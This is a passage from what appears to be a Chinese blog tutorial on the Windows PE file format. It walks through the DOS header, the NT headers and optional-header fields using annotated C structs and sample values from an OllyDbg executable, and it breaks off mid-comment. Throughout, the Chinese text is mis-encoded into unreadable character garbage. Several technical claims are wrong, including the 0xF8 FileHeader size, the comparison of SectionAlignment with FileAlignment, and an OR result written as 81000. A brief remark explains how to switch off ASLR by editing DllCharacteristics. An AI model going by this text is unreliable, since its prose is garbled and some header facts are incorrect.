    <content type="html"><![CDATA[<h2 id="0x1-åŸºç¡€æ¦‚å¿µ"><a href="#0x1-åŸºç¡€æ¦‚å¿µ" class="headerlink" title="0x1 åŸºç¡€æ¦‚å¿µ:"></a>0x1 åŸºç¡€æ¦‚å¿µ:</h2><table><thead><tr><th>EXEæ–‡ä»¶å’ŒDLLæ–‡ä»¶åŸºæœ¬ä¸Šåªæ˜¯è¯­ä¹‰ä¸Šçš„åŒºåˆ«, å”¯ä¸€åŒºåˆ«æ˜¯æœ‰ä¸€ä¸ªæ ‡è¯†å­—æ®µæŒ‡å‡ºEXEæˆ–DLL, å¸¸è§çš„PEæ–‡ä»¶æ ¼å¼æœ‰:DLLï¼ŒEXEï¼ŒOCXï¼ŒSYS, SCR, CPL, OBJç­‰</th></tr></thead><tbody><tr><td><strong>64ä½çš„PEæ–‡ä»¶æ ¼å¼, åšäº†ç®€å•çš„ä¿®é¥°, å«PE32+/PE+, 32ä½å­—æ®µæ‰©å±•ä½64å­—æ®µ</strong></td></tr><tr><td><strong>PEæ ¼å¼çš„å®šä¹‰åœ°æ–¹åœ¨ <code>winnt.h</code> å¤´æ–‡ä»¶ä¸­æˆ‘ä»¬èƒ½åœ¨å…¶ä¸­æ‰¾åˆ°PEæ–‡ä»¶çš„å®šä¹‰</strong>  <strong><em>å¦‚ä¸‹å›¾VCçš„è·¯å¾„æŸ¥æ‰¾</em></strong>  <a id="more"></a></td></tr><tr><td><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200507103628502-1590826740464.png" alt="image-20200507103628502"></td></tr><tr><td><strong>VAæ˜¯è¿›ç¨‹è™šæ‹Ÿå†…å­˜çš„ç»å¯¹åœ°å€, RVAæ˜¯ç›¸å¯¹è™šæ‹Ÿåœ°å€      RVA+ImageBase = VA</strong></td></tr><tr><td><strong>32ä½çš„Windows OSä¸­, å„è¿›ç¨‹éƒ½åˆ†é…æœ‰4GBçš„è™šæ‹Ÿå†…å­˜, æ‰€ä»¥VAèŒƒå›´: 00000000 ~ FFFFFFFF</strong></td></tr></tbody></table><p>PEæ–‡ä»¶æ€»ä½“æ¡†æ¶.</p><p><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200520084527063-1590826622690.png" alt="image-20200520084527063"></p><p>PEæ–‡ä»¶æ‰§è¡Œé¡ºåº.</p><table><thead><tr><th>1.æ‰§è¡Œä¸€ä¸ªPEæ–‡ä»¶æ—¶, PEè£…è½½å™¨é¦–å…ˆä¼šæ‰¾DOSå¤´ç­¾å(MZ),æ£€æŸ¥æ˜¯å¦æœ‰æ•ˆ,  ç„¶åæ˜¯DOSå¤´é‡Œçš„æ‰¾ e_lfanew(æœ€åä¸€ä¸ªæˆå‘˜, æŒ‡ç¤ºPEå¤´çš„), å¦‚æœæ‰¾åˆ°, åˆ™ç›´æ¥è·³è½¬.</th></tr></thead><tbody><tr><td><strong>2.æ‰¾åˆ°PEå¤´, å¼€å§‹æ£€æŸ¥PEå¤´ä¿¡æ¯å±æ€§æ˜¯å¦æœ‰æ•ˆ, å¦‚æœæœ‰æ•ˆ, å°±è·³è½¬åˆ°PEå¤´å°¾éƒ¨.</strong></td></tr><tr><td><strong>3.ç´§è·ŸPEå¤´å°¾éƒ¨çš„æ˜¯èŠ‚è¡¨, PEè£…è½½å™¨å¼€å§‹è¯»å–èŠ‚è¡¨ä¸­è®°å½•äº†æ¯ä¸ªå±æ€§çš„ä¿¡æ¯. å¹³ä¸”é‡‡ç”¨æ–‡ä»¶æ˜ å°„å°†è¿™äº›èŠ‚æ˜ å°„åˆ°å†…å­˜.    <u>æ–‡ä»¶æ˜ å°„: åœ¨æ‰§è¡Œä¸€ä¸ªPEæ–‡ä»¶çš„æ—¶å€™ï¼ŒWindowså¹¶ä¸åœ¨ä¸€å¼€å§‹å°±å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥å†…å­˜,è€Œæ˜¯é‡‡ç”¨ä¸å†…å­˜æ˜ å°„çš„æœºåˆ¶,ä¹Ÿå°±æ˜¯è¯´ï¼ŒWindowsè£…è½½å™¨åœ¨è£…è½½çš„æ—¶å€™ä»…ä»…å»ºç«‹å¥½è™šæ‹Ÿåœ°å€å’ŒPEæ–‡ä»¶ä¹‹é—´çš„æ˜ å°„å…³ç³»,åªæœ‰çœŸæ­£æ‰§è¡Œåˆ°æŸä¸ªå†…å­˜é¡µä¸­çš„æŒ‡ä»¤æˆ–è€…è®¿é—®æŸä¸€é¡µä¸­çš„æ•°æ®æ—¶,è¿™ä¸ªé¡µé¢æ‰ä¼šè¢«ä»ç£ç›˜æäº¤åˆ°ç‰©ç†å†…å­˜,è¿™ç§æœºåˆ¶ä½¿æ–‡ä»¶è£…å…¥çš„é€Ÿåº¦å’Œæ–‡ä»¶å¤§å°æ²¡æœ‰å¤ªå¤§çš„å…³ç³»</u></strong></td></tr><tr><td><strong>4.PEæ–‡ä»¶æ˜ å°„å…¥å†…å­˜å, PEè£…è½½å™¨ç»§ç»­å¤„ç†ä¸€äº›é€»è¾‘ç»“æ„, å¦‚è¾“å…¥è¡¨çš„ä¿®æ­£.</strong></td></tr></tbody></table><h2 id="0x2-MS-DOSå¤´éƒ¨åŠDOSå­˜æ ¹"><a href="#0x2-MS-DOSå¤´éƒ¨åŠDOSå­˜æ ¹" class="headerlink" title="0x2 MS-DOSå¤´éƒ¨åŠDOSå­˜æ ¹"></a>0x2 MS-DOSå¤´éƒ¨åŠDOSå­˜æ ¹</h2><table><thead><tr><th>DOSå¤´çš„ä½œç”¨æ˜¯å…¼å®¹MS-DOSæ“ä½œç³»ç»Ÿä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶, è¯¥ç»“æ„ä½“å¤§å°ä¸º64å­—èŠ‚(0x40)</th></tr></thead><tbody><tr><td><strong>2ä¸ªé‡è¦æˆå‘˜ e_magic(DOSå¤´ç¬¬ä¸€ä¸ªæˆå‘˜): DOSç­¾å(4D5A -&gt; ASCIIå€¼ MZ)    e_lfanew(DOSå¤´æœ€åä¸€ä¸ªæˆå‘˜): æŒ‡ç¤ºNTå¤´çš„åç§», ä»è¿™é‡Œæ‰¾åˆ°PEå¤´(å–å†³äºDOSå­˜æ ¹å¤§å°)</strong></td></tr><tr><td><strong>DOSå­˜æ ¹æ˜¯DOSå¤´ä¸PEæ–‡ä»¶å¤´ä¸­é—´éƒ¨åˆ†çš„å†…å®¹, ä¸º16ä½çš„æ±‡ç¼–æŒ‡ä»¤ç»„æˆ, æ—¢æœ‰ä»£ç ä¹Ÿæœ‰æ•°æ®, å¤§å°ä¸å›ºå®š</strong></td></tr><tr><td><strong>æˆ‘ä»¬çŸ¥é“DOSå­˜æ ¹çš„å†…å®¹æ˜¯å½“æˆ‘ä»¬çš„ç¨‹åºåœ¨DOSç¯å¢ƒä¸­è¿è¡Œæ—¶æ‰§è¡Œçš„ä»£ç , ä¹Ÿå°±æ˜¯ç»™ä¸€ä¸ªæç¤ºä¿¡æ¯:<code>This is program cannot be run in DOS mode</code>, é‚£æˆ‘ä»¬æ˜¯å¯ä»¥éšä¾¿å°†å…¶å†…å®¹ä¿®æ”¹ä¸ºè‡ªå·±æƒ³å¡«å……çš„ä¸œè¥¿, åæ­£ä¸ä¼šå½±å“åœ¨window osä¸­çš„è¿è¡Œ,  ä½†è®°ä½è¿™ä¸ªå¤§å°æ˜¯ä¸èƒ½ä¿®æ”¹çš„, ä¼šå½±å“åé¢æŒ‡ä»¤ç´¢å¼•åœ°å€è·Ÿç€å‡ºé”™, æœ€åç¨‹åºå´©æºƒ(åˆšå¼€å§‹å­¦ä¹ æ—¶åœ¨ä¸€é“é€†å‘é¢˜ä¸­, å°±çŠ¯äº†è¿™ä¸ªé”™)</strong>      <strong>å¦‚ä¸‹å›¾æ‰€ç¤ºODç¨‹åº, é‡è¦å­—æ®µå·²æ ‡å‡º(DOSå­˜æ ¹ä»0x40 - 0x1FF)</strong></td></tr><tr><td><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200508155307169-1590826775538.png" alt="image-20200508155307169"></td></tr></tbody></table><h2 id="0x3-NTå¤´"><a href="#0x3-NTå¤´" class="headerlink" title="0x3 NTå¤´"></a>0x3 NTå¤´</h2><p><strong>åˆ†åˆ«ä»‹ç»3ä¸ªç»“æ„ä½“</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DOWORD Signature;</span><br><span class="line">    <span class="comment">//PEå¤´çš„æ ‡å¿— 50450000</span></span><br><span class="line">    </span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    <span class="comment">//æ–‡ä»¶å¤´  size: 0xF8  è®°è½½æ–‡ä»¶çš„å¤§éƒ¨åˆ†å±æ€§</span></span><br><span class="line">    </span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">    <span class="comment">//å¯é€‰å¤´  very important</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     WORD    Machine;</span><br><span class="line">     <span class="comment">//æŒ‡å‡ºè¯¥PEæ–‡ä»¶è¿è¡Œçš„å¹³å°,æ¯ä¸ªCPUéƒ½æœ‰å”¯ä¸€çš„æ ‡è¯†ç ,ä¸€èˆ¬0x14c(x86)</span></span><br><span class="line">     <span class="number">014</span>C</span><br><span class="line">            </span><br><span class="line">     WORD    NumberOfSections; </span><br><span class="line">     <span class="comment">//æŒ‡å‡ºæ–‡ä»¶ä¸­å­˜åœ¨çš„èŠ‚åŒºæ•°é‡ æ³¨:è¿™é‡Œçš„å®šä¹‰ä¸€å®šè¦ç­‰äºå®é™…</span></span><br><span class="line">     <span class="comment">//å¤§å°, ä¸ç„¶ç¨‹åºä¼šè¿è¡Œå¤±è´¥</span></span><br><span class="line">     <span class="number">0008</span>      </span><br><span class="line">         </span><br><span class="line">     DWORD   TimeDateStamp;</span><br><span class="line">     <span class="comment">//PEæ–‡ä»¶çš„åˆ›å»ºæ—¶é—´ï¼Œä¸€èˆ¬æœ‰è¿æ¥å™¨å¡«å†™ UTCï¼ˆä¸–ç•Œæ ‡å‡†æ—¶é—´ï¼‰è¿›</span></span><br><span class="line">     <span class="comment">//è¡Œå­˜å‚¨ ä»1970å¹´1æœˆ1æ—¥00:00:00ç®—èµ·çš„ç§’æ•°å€¼ æˆ‘ä»¬å¯ä»¥ç”¨C</span></span><br><span class="line">     <span class="comment">//è¯­è¨€çš„localtime()å‡½æ•°(æ—¶åŒºä¹Ÿä¼šè½¬æ¢)è®¡ç®—.</span></span><br><span class="line">     <span class="number">40B</span>10868  </span><br><span class="line">         </span><br><span class="line">     DWORD   PointerToSymbolTable;</span><br><span class="line">     <span class="comment">//æŒ‡å‘ç¬¦å·è¡¨COFFçš„æŒ‡é’ˆ, ç”¨äºè°ƒè¯•ä¿¡æ¯. å‘ç°æ¯æ¬¡çœ‹éƒ½æ˜¯0</span></span><br><span class="line">     <span class="number">00000000</span></span><br><span class="line">         </span><br><span class="line">     DWORD   NumberOfSymbols;</span><br><span class="line">     <span class="comment">//ç¬¦å·è¡¨æ•°é‡. å‘ç°æ¯æ¬¡çœ‹éƒ½æ˜¯0</span></span><br><span class="line">     <span class="number">00000000</span></span><br><span class="line">         </span><br><span class="line">     WORD    SizeOfOptionalHeader;</span><br><span class="line">     <span class="comment">//æŒ‡å‡ºPEçš„IMAGE_OPTIONAL_HEADER32ç»“æ„ä½“æˆ–è€…</span></span><br><span class="line">     <span class="comment">//PE+æ ¼å¼æ–‡ä»¶çš„IMAGE_OPTIONAL_HEADER64ç»“æ„ä½“çš„é•¿åº¦</span></span><br><span class="line">     <span class="comment">//è¿™ä¸¤ä¸ªç»“æ„ä½“å°ºå¯¸æ˜¯ä¸ç›¸åŒçš„ï¼Œæ‰€ä»¥éœ€è¦SizeOfOptionalHeader</span></span><br><span class="line">     <span class="comment">//ä¸­æŒ‡æ˜å¤§å°32ä½é€šå¸¸ä½: E0  64ä½é€šå¸¸ä¸º: F0(ä¸æ˜¯ç»å¯¹çš„)</span></span><br><span class="line">     <span class="comment">//å®ƒä»¬åªæ˜¯æœ€å°å€¼ï¼Œå¯èƒ½æœ‰æ›´å¤§çš„å€¼</span></span><br><span class="line">     <span class="number">00E0</span>    </span><br><span class="line">         </span><br><span class="line">     WORD    Characteristics;</span><br><span class="line">     <span class="comment">//æ ‡è¯†æ–‡ä»¶çš„å±æ€§, æ–‡ä»¶æ˜¯å¦å¯è¿è¡Œ, æ˜¯å¦ä¸ºDLLæ–‡ä»¶ç­‰.</span></span><br><span class="line">     <span class="comment">//äºŒè¿›åˆ¶ä¸­æ¯ä¸€ä½ä»£è¡¨ä¸åŒå±æ€§, ä»¥ bit oRå½¢å¼ç»“åˆèµ·æ¥</span></span><br><span class="line">     <span class="comment">//2ä¸ªéœ€è¦è®°ä½çš„å€¼. 0002h:.exeæ–‡ä»¶  2000h: .dllæ–‡ä»¶ </span></span><br><span class="line">     <span class="number">010</span>E        </span><br><span class="line">          </span><br><span class="line"> &#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class="line"> </span><br><span class="line"> ä¸‹å›¾ä¸ºODç¨‹åºçš„æ–‡ä»¶å¤´. åœ¨ä¸Šé¢æ¯ä¸ªæˆå‘˜ä¸‹é¢ä¾æ¬¡æ ‡å‡º.</span><br></pre></td></tr></table></figure><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200507203805570-1590826622690.png" alt="image-20200507203805570"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DATA_DIRECTORY</span>////å®šä¹‰äº†<span class="title">DataDirectory</span>çš„ç»“æ„ä½“ </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DOWORD VirtualAddress;</span><br><span class="line">    <span class="comment">//è¯¥ç»“æ„ä½“çš„RVA</span></span><br><span class="line">    </span><br><span class="line">    DOWORD Size;</span><br><span class="line">    <span class="comment">//è¯¥ç»“æ„ä½“çš„å¤§å°</span></span><br><span class="line">&#125;IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>   </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    <span class="comment">//è¿™ä¸ªå¯é€‰å¤´çš„ç±»å‹  PE: 10Bh   PE+: 20Bh  å¯ä»¥ä¾æ¬¡åŒºåˆ†æ˜¯32ä½è¿˜æ˜¯64ä½</span></span><br><span class="line">    <span class="number">010B</span></span><br><span class="line">    </span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    <span class="comment">//é“¾æ¥å™¨çš„ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">05</span></span><br><span class="line">    </span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    <span class="comment">//é“¾æ¥å™¨çš„å°ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">00</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    <span class="comment">//ä»£ç æ®µçš„é•¿åº¦</span></span><br><span class="line">    <span class="number">000</span>AF000</span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–çš„æ•°æ®é•¿åº¦</span></span><br><span class="line">    <span class="number">0008</span>EC00</span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    <span class="comment">//æœªåˆå§‹åŒ–çš„æ•°æ®é•¿åº¦</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    <span class="comment">//ç¨‹åºEPçš„RVA, æŒ‡å‡ºç¨‹åºæœ€å…ˆæ‰§è¡Œä»£ç çš„èµ·å§‹åœ°å€ (å¾ˆé‡è¦)</span></span><br><span class="line">    <span class="number">00000100</span></span><br><span class="line">    </span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    <span class="comment">//ä»£ç æ®µèµ·å§‹åœ°å€çš„RVA</span></span><br><span class="line">    <span class="number">00000100</span></span><br><span class="line">    </span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    <span class="comment">//æ•°æ®æ®µèµ·å§‹åœ°å€çš„RVA</span></span><br><span class="line">    <span class="number">000B</span>0000</span><br><span class="line">    </span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    <span class="comment">//VA: 0~FFFFFFFF(32ä½ç³»ç»Ÿ).PEæ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿå†…å­˜æ—¶, æŒ‡å‡ºæ–‡ä»¶ä¼˜å…ˆè£…å…¥åœ°å€</span></span><br><span class="line">    <span class="comment">//EXE, DLLæ–‡ä»¶è¢«è£…è½½åˆ°0~7FFFFFFF</span></span><br><span class="line">    <span class="comment">//SYSæ–‡ä»¶è½½å…¥å†…æ ¸å†…å­˜çš„ 80000000~FFFFFFFF</span></span><br><span class="line">    <span class="comment">//æ‰§è¡ŒPEæ–‡ä»¶æ—¶,PEè£…è½½å™¨ä¼šæŠŠEIPè®¾ç½®ä¸º: ImageBase+AddressOfEntrypoint</span></span><br><span class="line">    <span class="number">00400000</span>    </span><br><span class="line">         </span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    <span class="comment">//èŠ‚åœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½ (å¯¹é½å•ä½) ä¸€èˆ¬ä¸º: 1000h</span></span><br><span class="line">    <span class="number">00001000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    <span class="comment">//èŠ‚åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„æœ€å°å•ä½ (å¯¹é½å•ä½) ä¸€èˆ¬ä¸º: 200h</span></span><br><span class="line">    <span class="comment">//ä¸€èˆ¬SectionAlignment &lt;= FileAlignment,èŠ‚çœå‚¨å­˜ç©ºé—´.</span></span><br><span class="line">    <span class="number">00000200</span>     </span><br><span class="line">    </span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    <span class="comment">//æ“ä½œç³»ç»Ÿä¸»ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">0004</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    <span class="comment">//æ“ä½œç³»ç»Ÿå°ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    <span class="comment">//æ˜ è±¡æ–‡ä»¶ä¸»ç‰ˆæœ¬å·, è¿™ä¸ªæ˜¯å¼€å‘è€…è‡ªå·±æŒ‡å®šçš„ï¼Œç”±è¿æ¥å™¨å¡«å†™(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    <span class="comment">//æ˜ è±¡æ–‡ä»¶å°ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    <span class="comment">//å­ç³»ç»Ÿç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="number">0004</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    <span class="comment">//å­ç³»ç»Ÿå°ç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    <span class="comment">//Win32ç‰ˆæœ¬å€¼ ç›®å‰çœ‹è¿‡çš„æ–‡ä»¶éƒ½æ˜¯ 0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    <span class="comment">//æŒ‡å®šPE imageåœ¨è™šæ‹Ÿå†…å­˜ä¸­æ‰€å ç©ºé—´çš„å¤§å° SectionAlignmentçš„å€æ•°</span></span><br><span class="line">    <span class="number">00180000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    <span class="comment">//æŒ‡å‡ºæ•´ä¸ªPEå¤´çš„å¤§å°(FileAlignmentæ•´æ•°å€)</span></span><br><span class="line">    <span class="comment">//å®ƒä¹Ÿæ˜¯ä»æ–‡ä»¶çš„å¼€å¤´åˆ°ç¬¬ä¸€èŠ‚çš„åŸå§‹æ•°æ®çš„åç§»é‡, å¯ä»¥æ‰¾åˆ°ç¬¬ä¸€èŠ‚åŒº</span></span><br><span class="line">    <span class="number">00000600</span>   </span><br><span class="line">    </span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    <span class="comment">//æ˜ è±¡æ–‡ä»¶çš„æ ¡éªŒå’Œ ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢è½½å…¥æ— è®ºå¦‚ä½•éƒ½ä¼šå†²çªçš„ã€å·²æŸåçš„äºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    <span class="comment">//è¯´æ˜æ˜ åƒæ–‡ä»¶åº”è¿è¡Œäºä»€ä¹ˆæ ·çš„NTå­ç³»ç»Ÿä¹‹ä¸Š</span></span><br><span class="line">    <span class="comment">//è¯¥å€¼ç”¨æ¥åŒºåˆ†ç³»ç»Ÿé©±åŠ¨æ–‡ä»¶(*.sys)ä¸æ™®é€šçš„å¯æ‰§è¡Œæ–‡ä»¶(*.exe, *.dll)</span></span><br><span class="line">    <span class="comment">//value: 1   å«ä¹‰: Driveræ–‡ä»¶  tips: ç³»ç»Ÿé©±åŠ¨(å¦‚: ntfs.sys)</span></span><br><span class="line">    <span class="comment">//value: 2   å«ä¹‰: GUIæ–‡ä»¶  tips: çª—å£åº”ç”¨ç¨‹åº(å¦‚: notepad.exe)</span></span><br><span class="line">    <span class="comment">//value: 3   å«ä¹‰: CUIæ–‡ä»¶     tips: æ§åˆ¶å°åº”ç”¨ç¨‹åº(å¦‚: cmd.exe)</span></span><br><span class="line">    <span class="number">0002</span>   </span><br><span class="line">            </span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    <span class="comment">//DLLçš„æ–‡ä»¶å±æ€§ å¦‚æœæ˜¯DLLæ–‡ä»¶ï¼Œä½•æ—¶è°ƒç”¨DLLæ–‡ä»¶çš„å…¥å£ç‚¹</span></span><br><span class="line">    <span class="comment">//ä¸€èˆ¬çš„exeæ–‡ä»¶æœ‰ä»¥ä¸‹2ä¸ªå±æ€§:</span></span><br><span class="line">    <span class="comment">//IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE(è¡¨ç¤ºæ”¯</span></span><br><span class="line">    <span class="comment">//æŒç»ˆç«¯æœåŠ¡å™¨)8000h  IMAGE_DLLCHARACTERISTICS_NX_COMPAT</span></span><br><span class="line">    <span class="comment">//(è¡¨ç¤ºç¨‹åºé‡‡ç”¨äº†)/NXCOMPATç¼–è¯‘100h  (bit or ä¸º 81000)</span></span><br><span class="line">    <span class="comment">//ä½†æ˜¯å¼€å¯äº†ASLRçš„ç¨‹åºä¼šå¤šä¸€ä¸ª</span></span><br><span class="line">    <span class="comment">//IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE(DLL can move)</span></span><br><span class="line">    <span class="comment">//40hçš„å±æ€§  (bit or åä¸º8140),é‚£å¯ä»¥ä¿®æ”¹è¿™é‡Œå…³é—­ASLR</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">         </span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    <span class="comment">//ä¿ç•™æ ˆçš„å¤§å° é»˜è®¤æ˜¯1MB</span></span><br><span class="line">    <span class="number">00100000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    <span class="comment">//åˆå§‹æ—¶æŒ‡å®šæ ˆå¤§å° 